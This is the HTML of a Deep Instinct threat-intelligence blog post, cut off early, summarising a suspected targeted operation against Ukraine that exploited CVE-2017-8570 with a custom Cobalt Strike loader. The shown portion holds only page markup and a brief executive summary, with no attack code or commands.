<!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><title>Uncorking Old Wine: Zero-Day from 2017 + Cobalt Strike Loader in Unholy Alliance</title><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/><meta name="description" content="The Deep Instinct Threat Lab discovered a suspected targeted operation against Ukraine, using CVE-2017-8570 as the initial vector. The operation, which could not be attributed to any known threat actor, employed a custom loader for Cobalt Strike Beacon. Deep Instinct is detecting all stages of the attack."/><link type="text/css" rel="stylesheet" data-href="https://use.typekit.net/zka3qml.css" data-optimized-fonts="true"/><link href="https://www.deepinstinct.com/blog/uncorking-old-wine-zero-day-cobalt-strike-loader" rel="canonical"/><link href="https://www.deepinstinct.com/blog/uncorking-old-wine-zero-day-cobalt-strike-loader" hrefLang="x-default" rel="alternate"/><link href="https://www.deepinstinct.com/blog/uncorking-old-wine-zero-day-cobalt-strike-loader" hrefLang="en" rel="alternate"/><link href="https://www.deepinstinct.com/ja/blog/uncorking-old-wine-zero-day-cobalt-strike-loader" hrefLang="ja" rel="alternate"/><meta property="og:title" content="Uncorking Old Wine: Zero-Day from 2017 + Cobalt Strike Loader in Unholy Alliance"/><meta property="og:description" content="The Deep Instinct Threat Lab discovered a suspected targeted operation against Ukraine, using CVE-2017-8570 as the initial vector. The operation, which could not be attributed to any known threat actor, employed a custom loader for Cobalt Strike Beacon. Deep Instinct is detecting all stages of the attack."/><meta property="og:url" content="https://www.deepinstinct.com/blog/uncorking-old-wine-zero-day-cobalt-strike-loader"/><meta property="og:image" content="https://www.deepinstinct.com/image/blt61c3dfc7363deead/6629802381c884594a38061c/ThreatResearchTeam_Blog_1200x627_C.png"/><meta property="og:site_name" content="Deep Instinct"/><meta property="article:published_time" content="2024-04-25T13:30:00.000Z"/><meta property="article:modified_time" content="2024-04-25T16:58:59.476Z"/><meta name="twitter:card" content="summary_large_image"/><meta name="twitter:site" content="@DeepInstinctSec"/><meta name="twitter:title" content="Uncorking Old Wine: Zero-Day from 2017 + Cobalt Strike Loader in Unholy Alliance"/><meta name="twitter:description" content="The Deep Instinct Threat Lab discovered a suspected targeted operation against Ukraine, using CVE-2017-8570 as the initial vector. The operation, which could not be attributed to any known threat actor, employed a custom loader for Cobalt Strike Beacon. Deep Instinct is detecting all stages of the attack."/><meta name="twitter:image" content="https://www.deepinstinct.com/image/blt61c3dfc7363deead/6629802381c884594a38061c/ThreatResearchTeam_Blog_1200x627_C.png"/><meta class="swiftype" name="title" data-type="string" content="Uncorking Old Wine: Zero-Day from 2017 + Cobalt Strike Loader in Unholy Alliance"/><meta class="swiftype" name="description" data-type="string" content="The Deep Instinct Threat Lab discovered a suspected targeted operation against Ukraine, using CVE-2017-8570 as the initial vector. The operation, which could not be attributed to any known threat actor, employed a custom loader for Cobalt Strike Beacon. Deep Instinct is detecting all stages of the attack."/><meta class="swiftype" name="language" data-type="string" content="en"/><meta class="swiftype" name="last_modified" data-type="date" content="2024-04-25T16:58:59.476Z"/><script type="application/ld+json">
{
  "@context":"https://schema.org",
  "@graph":[
    {
      "@type":"WebSite",
      "@id":"https://www.deepinstinct.com/#website",
      "url":"https://www.deepinstinct.com/",
      "name":"Deep Instinct",
      "description":"The Deep Learning AI Cybersecurity Platform, Offering Cyber Threat Prevention Solutions.",
      "inLanguage":"en"
    },
    {
      "@type":"WebPage",
      "@id":"https://www.deepinstinct.com/blog/uncorking-old-wine-zero-day-cobalt-strike-loader#webpage",
      "url":"https://www.deepinstinct.com/blog/uncorking-old-wine-zero-day-cobalt-strike-loader",
      "name":"Uncorking Old Wine: Zero-Day from 2017 + Cobalt Strike Loader in Unholy Alliance",
      "isPartOf":{"@id":"https://www.deepinstinct.com/#website"},
      "datePublished":"2024-04-25T13:30:00.000Z",
      "dateModified":"2024-04-25T16:58:59.476Z",
      "description":"The Deep Instinct Threat Lab discovered a suspected targeted operation against Ukraine, using CVE-2017-8570 as the initial vector. The operation, which could not be attributed to any known threat actor, employed a custom loader for Cobalt Strike Beacon. Deep Instinct is detecting all stages of the attack.",
      "inLanguage":"en"
    }
  ]
}
  </script><script src="https://www.googleoptimize.com/optimize.js?id=OPT-P298HTJ"></script><link rel="apple-touch-icon" sizes="180x180" href="/favicon/apple-touch-icon.png"/><link rel="icon" type="image/png" sizes="32x32" href="/favicon/favicon-32x32.png"/><link rel="icon" type="image/png" sizes="16x16" href="/favicon/favicon-16x16.png"/><link rel="mask-icon" href="/favicon/safari-pinned-tab.svg" color="#5bbad5"/><meta name="msapplication-TileColor" content="#da532c"/><meta name="theme-color" content="#ffffff"/><meta name="next-head-count" content="33"/><script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-52PC3MW');
function getUTMParams() {
    let params = new URLSearchParams(window.location.search);
    let utmCampaign = params.get('_ga');
   
    localStorage.setItem('utm_campaign', utmCampaign);
}
</script><link rel="preload" href="/_next/static/css/750ec5d7420478b9.css" as="style"/><link rel="stylesheet" href="/_next/static/css/750ec5d7420478b9.css" data-n-g=""/><link rel="preload" href="/_next/static/css/b3c831d72c60daeb.css" as="style"/><link rel="stylesheet" href="/_next/static/css/b3c831d72c60daeb.css" data-n-p=""/><link rel="preload" href="/_next/static/css/ddca67f80ea11511.css" as="style"/><link rel="stylesheet" href="/_next/static/css/ddca67f80ea11511.css"/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/_next/static/chunks/polyfills-c67a75d1b6f99dc8.js"></script><script id="Cookiebot" src="https://consent.cookiebot.com/uc.js" data-cbid="000353a0-bc31-4071-a34b-8905de7b1675" data-blockingmode="auto" defer="" data-nscript="beforeInteractive"></script><script defer="" src="/_next/static/chunks/5935-76bf011ee3d88f83.js"></script><script defer="" src="/_next/static/chunks/7029-3230841eb82dea3f.js"></script><script defer="" src="/_next/static/chunks/6839.c8ee40f8e73e0e22.js"></script><script src="/_next/static/chunks/webpack-d130c9295ed0ba68.js" defer=""></script><script src="/_next/static/chunks/framework-314c182fa7e2bf37.js" defer=""></script><script src="/_next/static/chunks/main-c5b7e6d77b82bab5.js" defer=""></script><script src="/_next/static/chunks/pages/_app-88813e0d1ae2e973.js" defer=""></script><script src="/_next/static/chunks/5675-5d8e1c18eb2a06a1.js" defer=""></script><script src="/_next/static/chunks/8882-efb8f68e8ac16c1e.js" defer=""></script><script src="/_next/static/chunks/1053-69c3e67c1a3e9c2f.js" defer=""></script><script src="/_next/static/chunks/512-de9e9b45ad8341f5.js" defer=""></script><script src="/_next/static/chunks/pages/blog/%5Bpid%5D-7f7601d838d136ca.js" defer=""></script><script src="/_next/static/nHrLbpBAijfh0TcvFHHAo/_buildManifest.js" defer=""></script><script src="/_next/static/nHrLbpBAijfh0TcvFHHAo/_ssgManifest.js" defer=""></script><link rel="stylesheet" href="https://use.typekit.net/zka3qml.css"/></head><body><noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-52PC3MW" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript><div id="__next"><div class="page"><div class="site-wide-alert bg-blue"><div class="container--full"><div class="container"><div class="site-wide-alert__content text-center py-2"><h2 class="site-wide-alert__title text-m my-1 mr-3 inline-block text-white">Discover how Deep Instinct Prevention for Storage (DPS) protects your NAS storage more effectively than Trellix.</h2><a class="inline-block font-bold uppercase text-cta tracking-widder undefined button_btn--link__RQBF4 undefined button_btn--arrow-yellow__LVTTd text-yellow" href="/deep-instinct-versus-trellix">Learn More<i class="button_btn__icon__m_ZnD"><svg fill="currentColor" width="16" height="10" viewBox="0 0 16 10" class="icon inline-block align-middle" preserveAspectRatio="xMaxYMax meet" focusable="false"><g stroke="currentColor"><path d="M10 2l4 3-4 3M13 5H0"></path></g><defs><clipPath id="clip0"><path fill="currentColor" d="M0 0h15v9H0z" transform="rotate(-180 8 5)"></path></clipPath></defs></svg></i></a></div></div></div></div><header class="header top-0 z-50 relative header_header__ts5le header_white__g4PkN sticky"><div id="header-inner" class="header-inner pt-4 pb-3 lg:pt-6 lg:pb-5 w-full header_header-inner___UpZ4"><div data-focus-guard="true" tabindex="-1" style="width:1px;height:0px;padding:0;overflow:hidden;position:fixed;top:1px;left:1px"></div><div data-focus-lock-disabled="disabled"><div class="lg:flex lg:justify-between container header_header-wrap__n6kfO"><div class="flex justify-between lg:items-center"><a aria-label="to home page" class="logo_logo-wrap__H2Rxo" href="/"><svg fill="currentColor" width="135" height="67" viewBox="0 0 994 471.4" class="icon inline-block align-middle relative z-50 logo_logo__PUfyf" preserveAspectRatio="xMaxYMax meet" focusable="false"><path d="M964.49 294.51h1.38v-16.97h6.88v-1.38h-15.14v1.38h6.88v16.97zM31.01 309.46h42.48v161.19H31.01z" fill="currentColor"></path><path d="M226.82 324.53c-10.25-8.72-27.69-13.27-53.1-13.27h-82.3v161.19h42.85V345.77h36c13.65 0 21.24 1.14 25 4.93 4.55 4.55 6.83 12.52 6.83 24.65v97.1h40.58V370c.07-21.2-5.24-36-15.86-45.47Z" fill="currentColor" transform="translate(-3 -1.8)"></path><path d="M521.06 309.46h42.85v161.19h-42.85z" fill="currentColor"></path><path d="M714.6 324.53c-10.25-9.1-26.94-13.27-52-13.27h-81.13v161.19h39.45V345.77h38.3c12.9 0 20.1 1.14 23.89 4.93 4.18 4.18 6.07 11.38 6.07 24.65v97.1h40.21V370c0-22-4.55-36.75-14.79-45.47ZM939.74 277.51h-40.59v33.37h-73.57c-15.17 0-26.55.77-36 3.8a62.75 62.75 0 0 0-25 15.17 74.23 74.23 0 0 0-17.83 27.69 99.23 99.23 0 0 0-6.45 35.64 92.67 92.67 0 0 0 6.45 34.14 75.85 75.85 0 0 0 17.83 27.31c6.45 6.07 14 10.24 24.65 14 9.48 3 21.62 3.8 36.79 3.8h57.65v-34.49h-44.44c-12.13 0-19.34-.38-23.89-1.14s-10.62-2.28-14-4.18c-6.82-4.17-10.24-6.07-13.27-12.89-3.41-6.82-4.93-15.55-4.93-26.17 0-18.58 4.17-31.49 12.13-39.07 8.34-7.58 23.51-8.34 44-8.34h60.31v78.12c0 16.31 3.8 27.69 12.13 36.79 8 8.35 19 12.14 36 12.14H986v-28.07h-15.92c-11 0-19-2.64-23.51-7.58-4.55-5.31-6.83-14.41-6.83-26.92v-64.1h49.69V312h-49.69ZM464.36 272.9l-40.58 24.29v12.92H309.63c-20.48 0-34.51 4.17-43.62 12.13-9.11 8.34-13.66 20.85-13.66 38.31s3.8 29.58 11.38 36c7.59 6.83 22.76 10.24 44.76 10.24h37.93c9.1 0 15.17 1.15 19 3.8 4.17 3 6.45 7.59 6.45 13.65s-2.28 10.24-6.45 13.27c-4.55 3-11.75 3.8-19 3.8h-90.65v30.72h111.51c13.66 0 23.52-4.17 31.49-12.89 8.34-9.49 12.51-21.24 12.51-36 0-15.56-4.55-26.56-14-34.9-8.72-8-22-11.38-40.58-11.38h-39.85c-8.73 0-14-2.65-16.69-4.55-3.79-2.65-5.69-7.58-5.69-13.27 0-6.45 2.28-10.62 6.45-13.27 3.8-2.28 12.52-3.41 25.41-3.41h97.09v81.16c0 16.31 3.79 28.07 12.14 36.79 8 8.34 18.95 12.14 35.64 12.14l38.68-.07v-28.77h-16.31c-11 0-18.59-2.66-23.13-8-4.55-4.93-6.45-14-6.45-26.93v-67.09h45.89v-31.48h-45.52ZM995 277.5c-.92 0-1.46.51-1.91 1.89 0 0-5 14.92-6 14.92s-6-14.92-6-14.92c-.47-1.37-1-1.89-1.92-1.89-2.29 0-2 1.84-2 1.84v17h1.38v-17c0-.46.77-.9 1.29.15s5.17 16.81 7.26 16.81 6.74-15.75 7.27-16.81 1.29-.62 1.29-.15v17H997v-17s.26-1.84-2-1.84Z" fill="currentColor" transform="translate(-3 -1.8)"></path><path d="M503.43 77.18h-80.3v204.67L464 257.23v-21.32h37.12c15.91 0 28.79-1.9 38.26-5.68a58.4 58.4 0 0 0 24.63-18.56 73 73 0 0 0 12.87-23.86 99.81 99.81 0 0 0 4.21-28.81c-.39-25.77-7.21-45.85-20.84-60.25s-32.59-21.57-56.82-21.57ZM526.91 192c-7.2 7.19-19.7 11-36.75 11h-26.52v-92.86h29.93c16.29 0 28 3.41 34.47 10.23 6.82 6.82 9.85 18.56 9.85 34.85.01 17.43-3.78 29.55-10.98 36.78ZM228.4 110.14a46 46 0 0 1 46.21 44.32l.38 4.17a87.25 87.25 0 0 0 6.06 29.17 88 88 0 0 0 17.05 25.38 83.12 83.12 0 0 0 25.38 17 81.12 81.12 0 0 0 31.07 6.06h55.3v-33h-55.3A46 46 0 0 1 308.33 159l-.37-4.17a87.26 87.26 0 0 0-6.07-29.17 87.74 87.74 0 0 0-17-25.38 82.84 82.84 0 0 0-25.39-17 78.54 78.54 0 0 0-31.06-6.44H172v33.33h56.4Z" fill="currentColor" transform="translate(-3 -1.8)"></path><path d="m318.18 156 .38 4.16a27.28 27.28 0 0 0 2.27 11h89v-31.48h-93.17a118.19 118.19 0 0 1 1.52 16.32ZM264.77 161.28l-.38-4.17c-.37-6.06-1.89-12.12-5.3-17H172v31.44h93.19c-.05-3.83-.42-7.24-.42-10.27ZM315.54 132.49a46.41 46.41 0 0 1 39.4-22h54.91V77.18h-54.92a79.91 79.91 0 0 0-31.06 6.44 74.14 74.14 0 0 0-25 16.67 93.47 93.47 0 0 1 12.88 21.22 95 95 0 0 1 3.79 10.98ZM268.18 181a46.42 46.42 0 0 1-39.4 22h-56.71v32.56h56.7c11.37 0 21.59-1.89 31.06-6.06a74.14 74.14 0 0 0 25-16.67A93.47 93.47 0 0 1 272 191.57a43.64 43.64 0 0 1-3.82-10.57ZM159.48 235.52V1.8h-39.42v75.39H82.93c-15.91 0-28.79 1.89-38.26 5.68a58.32 58.32 0 0 0-24.62 18.56 73.06 73.06 0 0 0-12.88 23.86A99.76 99.76 0 0 0 3 154.08c0 25.38 6.82 45.84 20.45 59.85q20.46 21.6 56.82 21.59h79.21Zm-39.81-32.19H90.12c-16.28 0-27.65-3.4-34.47-10.23s-10.23-18.56-10.23-34.85c0-16.67 3.79-29.17 11-36.37s19.71-11 37.13-11h26.14Z" fill="currentColor" transform="translate(-3 -1.8)"></path></svg></a><button data-autofocus="false" aria-label="open menu" class="bg-yellow items-center flex justify-center rounded-full z-50 lg:hidden button-menu_header__button__ym788"><span class="sr-only block">Open menu</span><span class="sr-only hidden">Close menu</span><span class="icon flex flex-col justify-center button-menu_icon-wrap__y2ev2"><span class="block"></span><span class="block"></span><span class="block"></span></span></button></div><div class="hidden"><nav><ul class="main-menu lg:relative lg:flex justify-end items-baseline main_wrap__wT1ud"></ul></nav><div class="lg:flex justify-end mt-8 pt-4 lg:mt-0 lg:pt-0 border-t border-white lg:border-0 lg:mb-2"><nav class="header-secondary"><ul class="flex lg:block justify-around mb-5 lg:mb-0"><li class="lg:ml-9 inline-block hover:underline"><a class="link--secondary capitalize text-menu-sm font-semibold lg:mb-3" href="/partners">Partners</a></li><li class="lg:ml-9 inline-block hover:underline"><a class="link--secondary capitalize text-menu-sm font-semibold lg:mb-3" target="_blank" rel="noopener" href="https://portal.deepinstinct.com">Login</a></li></ul></nav><nav class="language-switcher lg:ml-9"><ul></ul></nav><div class="relative lg:ml-5 lg:w-5"><div class="hidden absolute w-full -top-1 lg:-right-0"><div class="relative"><form><input type="text" placeholder="Search..." class="st-default-search-input w-56 HeaderSearch_header-search-icon__3pO2z"/></form><div class="absolute w-full z-50 bg-white text-blue rounded py-2 px-5 HeaderSearch_header-search-results__LbnDx">Please enter keyword to search.</div></div></div><button class="mb-3 ml-3 absolute right-5 lg:right-3 top-1 lg:ml-0 lg:top-0 z-10"><svg fill="currentColor" width="16" height="16" viewBox="0 0 16 16" class="icon inline-block align-middle" preserveAspectRatio="xMaxYMax meet" focusable="false"><path d="M15.3169 13.9331L11.5862 10.2025C12.6029 8.95914 13.1027 7.37257 12.9824 5.77099C12.8621 4.16941 12.1307 2.67535 10.9397 1.59784C9.74871 0.520335 8.18911 -0.058176 6.58351 -0.0180311C4.97792 0.0221137 3.44918 0.677843 2.31349 1.81352C1.17781 2.94921 0.522083 4.47795 0.481938 6.08354C0.441793 7.68914 1.0203 9.24874 2.09781 10.4398C3.17532 11.6308 4.66938 12.3621 6.27096 12.4824C7.87254 12.6028 9.45911 12.1029 10.7025 11.0863L14.4331 14.8169C14.551 14.9307 14.7089 14.9937 14.8727 14.9923C15.0366 14.9909 15.1934 14.9252 15.3092 14.8093C15.4251 14.6934 15.4909 14.5366 15.4923 14.3728C15.4937 14.2089 15.4307 14.051 15.3169 13.9331ZM6.74999 11.25C5.76108 11.25 4.79438 10.9568 3.97213 10.4074C3.14989 9.85796 2.50903 9.07706 2.13059 8.16343C1.75215 7.2498 1.65313 6.24447 1.84606 5.27456C2.03899 4.30466 2.51519 3.41374 3.21445 2.71448C3.91371 2.01522 4.80463 1.53902 5.77453 1.34609C6.74444 1.15316 7.74977 1.25218 8.6634 1.63062C9.57703 2.00906 10.3579 2.64992 10.9073 3.47216C11.4567 4.29441 11.75 5.26111 11.75 6.25002C11.7485 7.57564 11.2212 8.84655 10.2839 9.78391C9.34652 10.7213 8.07561 11.2485 6.74999 11.25Z" fill="currentColor"></path></svg></button></div></div></div></div></div><div data-focus-guard="true" tabindex="-1" style="width:1px;height:0px;padding:0;overflow:hidden;position:fixed;top:1px;left:1px"></div></div></header><main role="main"><div class="blog-content BlogContent_blog-content__xmvuQ"><div class="blog-header"><div class="blog-header__image relative"><div class="absolute left-0 top-0 w-full h-4/5 bg-blue"></div><div class="container mx-auto"><div class="blog-header__image max-w-blog w-full mx-auto relative z-1 pt-9 mb-12"><a class="inline-block font-bold uppercase text-cta tracking-widder undefined button_btn--link__RQBF4 undefined button_btn--arrow-left__8dYK2 undefined button_btn--arrow-left-blue__c3n8m px-3.5 py-4 absolute left-0 z-1 uppercase !tracking-widest hover:underline bg-yellow text-blue BlogHeader_blog-header__back__Ju0lb" href="/blog">Back To Blog<i class="button_btn__icon__m_ZnD"><svg fill="currentColor" width="16" height="10" viewBox="0 0 16 10" class="icon inline-block align-middle" preserveAspectRatio="xMaxYMax meet" focusable="false"><g stroke="currentColor"><path d="M10 2l4 3-4 3M13 5H0"></path></g><defs><clipPath id="clip0"><path fill="currentColor" d="M0 0h15v9H0z" transform="rotate(-180 8 5)"></path></clipPath></defs></svg></i></a><img alt="" title="" aria-hidden="true" loading="lazy" width="930" height="400" decoding="async" data-nimg="1" style="color:transparent;width:100%;height:auto;object-fit:cover" sizes="100vw" srcSet="/_next/image?url=https%3A%2F%2Fwww.deepinstinct.com%2Fimage%2Fblt61c3dfc7363deead%2F6629802381c884594a38061c%2FThreatResearchTeam_Blog_1200x627_C.png&amp;w=640&amp;q=100 640w, /_next/image?url=https%3A%2F%2Fwww.deepinstinct.com%2Fimage%2Fblt61c3dfc7363deead%2F6629802381c884594a38061c%2FThreatResearchTeam_Blog_1200x627_C.png&amp;w=768&amp;q=100 768w, /_next/image?url=https%3A%2F%2Fwww.deepinstinct.com%2Fimage%2Fblt61c3dfc7363deead%2F6629802381c884594a38061c%2FThreatResearchTeam_Blog_1200x627_C.png&amp;w=1024&amp;q=100 1024w, /_next/image?url=https%3A%2F%2Fwww.deepinstinct.com%2Fimage%2Fblt61c3dfc7363deead%2F6629802381c884594a38061c%2FThreatResearchTeam_Blog_1200x627_C.png&amp;w=1200&amp;q=100 1200w, /_next/image?url=https%3A%2F%2Fwww.deepinstinct.com%2Fimage%2Fblt61c3dfc7363deead%2F6629802381c884594a38061c%2FThreatResearchTeam_Blog_1200x627_C.png&amp;w=1400&amp;q=100 1400w, /_next/image?url=https%3A%2F%2Fwww.deepinstinct.com%2Fimage%2Fblt61c3dfc7363deead%2F6629802381c884594a38061c%2FThreatResearchTeam_Blog_1200x627_C.png&amp;w=1680&amp;q=100 1680w, /_next/image?url=https%3A%2F%2Fwww.deepinstinct.com%2Fimage%2Fblt61c3dfc7363deead%2F6629802381c884594a38061c%2FThreatResearchTeam_Blog_1200x627_C.png&amp;w=1920&amp;q=100 1920w, /_next/image?url=https%3A%2F%2Fwww.deepinstinct.com%2Fimage%2Fblt61c3dfc7363deead%2F6629802381c884594a38061c%2FThreatResearchTeam_Blog_1200x627_C.png&amp;w=2048&amp;q=100 2048w, /_next/image?url=https%3A%2F%2Fwww.deepinstinct.com%2Fimage%2Fblt61c3dfc7363deead%2F6629802381c884594a38061c%2FThreatResearchTeam_Blog_1200x627_C.png&amp;w=3840&amp;q=100 3840w" src="/_next/image?url=https%3A%2F%2Fwww.deepinstinct.com%2Fimage%2Fblt61c3dfc7363deead%2F6629802381c884594a38061c%2FThreatResearchTeam_Blog_1200x627_C.png&amp;w=3840&amp;q=100"/></div></div></div><div class="blog-header__content container mx-auto mb-12"><div class="max-w-blog w-full mx-auto pb-9 border-b-2 border-grey"><div class="flex justify-between mb-12"><div class="font-sans font-bold text-sm tracking-widest pt-2"><svg fill="currentColor" width="108" height="74" viewBox="0 0 108 74" class="icon inline-block align-middle w-3 h-auto text-blue mr-2 pb-0.5" preserveAspectRatio="xMaxYMax meet" focusable="false"><path fill="currentColor" d="M44.4768 35.7511l.1732 1.9185c.1506 4.5919 1.1008 9.1233 2.8086 13.3936 1.9192 4.3149 4.5894 8.2604 7.8879 11.656 3.3942 3.3069 7.3765 5.9611 11.7452 7.828 4.5389 1.9426 9.4284 2.9494 14.3714 2.9593h26.1259V58.1943H81.4631c-5.5289.025-10.8511-2.0845-14.8415-5.8825-3.9904-3.798-6.3365-8.987-6.5423-14.4702l-.1733-1.9186c-.1506-4.5918-1.1008-9.1232-2.8086-13.3935-1.9249-4.3117-4.5944-8.2564-7.8879-11.656-3.3912-3.31055-7.3743-5.96513-11.7452-7.82796C32.9045 1.18953 28.0212.242402 23.0929.258217L-1363.38.258097V15.3982l1386.4729.0001c5.5289-.0249 10.8511 2.0846 14.8415 5.8826 3.9904 3.798 6.3366 8.987 6.5424 14.4702z"></path><path fill="currentColor" d="M39.9171 37.1447l-.1733-1.9095c.0089-1.7374-.3483-3.4574-1.0487-5.0497l-1402.0751-.0001v14.4795l1403.9991.0001c-.4051-2.4759-.6396-4.9765-.702-7.4841M64.4654 30.0136c0 1.7375.1733 3.3031.1733 4.6968l.1732 1.9095c.0892 2.7814.9371 5.4868 2.4531 7.828h40.324V30.0136H64.4654zM63.0609 25.6608c1.9239-3.0828 4.6085-5.6274 7.7999-7.3932 3.1914-1.7657 6.7841-2.6941 10.4379-2.6973h26.2993V.611107L81.2439.611105c-4.9345-.082349-9.8312.867315-14.3714 2.787275-4.3397 1.74338-8.2745 4.34875-11.5627 7.65612 2.4133 2.9712 4.4158 6.2491 5.9546 9.7466.7914 1.5385 1.3799 3.1719 1.7508 4.8597M22.8829 73.3344c4.9442-.0262 9.8334-1.0323 14.3805-2.9592 4.3379-1.7468 8.272-4.3517 11.5628-7.6561-2.4166-2.969-4.4193-6.2472-5.9546-9.7464-.6902-1.6429-1.278-3.3263-1.76-5.0407-1.9239 3.0827-4.6085 5.6274-7.8 7.3931-3.1914 1.7657-6.784 2.6941-10.4379 2.6973l-1386.2537-.0001v15.312l1386.2629.0001z"></path></svg>APRIL 25, 2024</div><div class="social-share SocialShare_social-share__4Q7V0"><button aria-label="linkedin" class="react-share__ShareButton social-share__btn linkedin hover:opacity-80" style="background-color:transparent;border:none;padding:0;font:inherit;color:inherit;cursor:pointer"><svg fill="currentColor" width="22" height="22" viewBox="0 0 22 22" class="icon inline-block align-middle" preserveAspectRatio="xMaxYMax meet" focusable="false"><path d="M4.58333 2.3913C4.58333 3.73043 3.575 4.78261 2.29167 4.78261C1.00833 4.78261 0 3.73043 0 2.3913C0 1.05217 1.00833 0 2.29167 0C3.575 0 4.58333 1.05217 4.58333 2.3913ZM4.58333 6.69565H0V22H4.58333V6.69565ZM11.9167 6.69565H7.33333V22H11.9167V13.9652C11.9167 9.46957 17.4167 9.08696 17.4167 13.9652V22H22V12.3391C22 4.78261 13.8417 5.06956 11.9167 8.8V6.69565Z" fill="currentColor"></path></svg></button><button aria-label="twitter" class="react-share__ShareButton social-share__btn twitter hover:opacity-80" style="background-color:transparent;border:none;padding:0;font:inherit;color:inherit;cursor:pointer"><svg fill="currentColor" width="23" height="19" viewBox="0 0 23 19" class="icon inline-block align-middle" preserveAspectRatio="xMaxYMax meet" focusable="false"><path d="M7.23329 19C15.9129 19 20.6595 11.6908 20.6595 5.35298C20.6595 5.14532 20.6553 4.93872 20.6459 4.73292C21.5673 4.05595 22.3683 3.21094 23 2.24946C22.1545 2.63129 21.2447 2.88841 20.2902 3.00434C21.2643 2.4106 22.0125 1.47093 22.3654 0.35098C21.4535 0.900584 20.4437 1.29996 19.3691 1.51533C18.5077 0.583106 17.2813 0 15.9244 0C13.3182 0 11.2048 2.14816 11.2048 4.79593C11.2048 5.17244 11.2464 5.53831 11.327 5.88956C7.40542 5.68934 3.92781 3.78048 1.60068 0.878514C1.19495 1.58712 0.961353 2.41086 0.961353 3.28911C0.961353 4.95308 1.79452 6.42214 3.06142 7.28178C2.28736 7.25758 1.56014 7.04114 0.924206 6.68165C0.92316 6.7016 0.92316 6.7218 0.92316 6.74281C0.92316 9.06593 2.55 11.0054 4.70893 11.4449C4.31261 11.5547 3.89564 11.6137 3.46505 11.6137C3.16108 11.6137 2.86548 11.5829 2.57799 11.5273C3.17861 13.4327 4.92082 14.8196 6.98635 14.8587C5.37102 16.1454 3.33635 16.9119 1.12563 16.9119C0.745015 16.9119 0.369369 16.8899 0 16.8455C2.08829 18.2058 4.56793 19 7.23329 19Z" fill="currentColor"></path></svg></button><button aria-label="facebook" class="react-share__ShareButton social-share__btn facebook hover:opacity-80" style="background-color:transparent;border:none;padding:0;font:inherit;color:inherit;cursor:pointer"><svg fill="currentColor" width="13" height="26" viewBox="0 0 13 26" class="icon inline-block align-middle" preserveAspectRatio="xMaxYMax meet" focusable="false"><path d="M3.25 8.66667H0V13H3.25V26H8.66667V13H12.5667L13 8.66667H8.66667V6.825C8.66667 5.85 8.88333 5.41667 9.85833 5.41667H13V0H8.88333C4.98333 0 3.25 1.73333 3.25 4.98333V8.66667Z" fill="currentColor"></path></svg></button></div></div><h1 class="text-h-md lg:text-h-lg mb-6">Uncorking Old Wine: Zero-Day from 2017 + Cobalt Strike Loader in Unholy Alliance</h1><div class="blog-header__author mt-7 md:grid md:gap-4 md:grid-cols-3"><div class="mb-3 md:mb-0"><a class="author-teaser hover:underline AuthorTeaser_author-teaser__cItRk" href="/author/ivan-kosarev"><span class="author-teaser__image block"><img alt="Ivan Kosarev" loading="lazy" width="60" height="60" decoding="async" data-nimg="1" class="rounded-full overflow-hidden" style="color:transparent;max-width:100%;height:auto" srcSet="/_next/image?url=https%3A%2F%2Fimages.contentstack.io%2Fv3%2Fassets%2Fblt1ec077b6b53d6b3e%2Fblt0cf06d1687eae8f6%2F662a583851b16fd55bc4f095%2FIvan_Kosarev.png&amp;w=64&amp;q=75 1x, /_next/image?url=https%3A%2F%2Fimages.contentstack.io%2Fv3%2Fassets%2Fblt1ec077b6b53d6b3e%2Fblt0cf06d1687eae8f6%2F662a583851b16fd55bc4f095%2FIvan_Kosarev.png&amp;w=128&amp;q=75 2x" src="/_next/image?url=https%3A%2F%2Fimages.contentstack.io%2Fv3%2Fassets%2Fblt1ec077b6b53d6b3e%2Fblt0cf06d1687eae8f6%2F662a583851b16fd55bc4f095%2FIvan_Kosarev.png&amp;w=128&amp;q=75"/></span><span class="author-teaser__content block text-m pt-2"><span class="font-semibold block">Ivan Kosarev</span><span class="block">Threat Intelligence Researcher</span></span></a></div><div class="mb-3 md:mb-0"><a class="author-teaser hover:underline AuthorTeaser_author-teaser__cItRk" href="/author/deep-instinct-research"><span class="author-teaser__image block"><img alt="Deep Instinct Threat Lab" loading="lazy" width="60" height="60" decoding="async" data-nimg="1" class="rounded-full overflow-hidden" style="color:transparent;max-width:100%;height:auto" srcSet="/_next/image?url=https%3A%2F%2Fimages.contentstack.io%2Fv3%2Fassets%2Fblt1ec077b6b53d6b3e%2Fbltfdfca743f7ac9662%2F630e2d5d8bdc107d4a01ba3f%2F800x800-blue-monogram.png&amp;w=64&amp;q=75 1x, /_next/image?url=https%3A%2F%2Fimages.contentstack.io%2Fv3%2Fassets%2Fblt1ec077b6b53d6b3e%2Fbltfdfca743f7ac9662%2F630e2d5d8bdc107d4a01ba3f%2F800x800-blue-monogram.png&amp;w=128&amp;q=75 2x" src="/_next/image?url=https%3A%2F%2Fimages.contentstack.io%2Fv3%2Fassets%2Fblt1ec077b6b53d6b3e%2Fbltfdfca743f7ac9662%2F630e2d5d8bdc107d4a01ba3f%2F800x800-blue-monogram.png&amp;w=128&amp;q=75"/></span><span class="author-teaser__content block text-m pt-2"><span class="font-semibold block">Deep Instinct Threat Lab</span></span></a></div></div></div></div></div><div class="text-block container--full"><div class="container mx-auto relative mb-6 lg:mb-10 overflow-hidden"><div class="max-w-blog w-full mx-auto TextBlock_text__JUObc"><div class="paragraph-item"><h5>Executive Summary</h5><ul><li>The Deep Instinct Threat Lab discovered a suspected targeted operation against Ukraine</li><li>The operation is using CVE-2017-8570 as the initial vector</li><li>The operation could not be attributed to any known threat actor</li><li>The operation used a custom loader for Cobalt Strike Beacon</li><li>Deep Instinct is detecting all stages of the attack</li></ul><p></p><p></p><p></p><h5>Campaign Overview</h5><p></p><figure style="text-align:center"><div data-img-caption-container="true" style="display:inline-block;text-align:center"><img asset_uid="bltc1c7893c1561616d" alt="fig1-campaign-attack-flow.png" 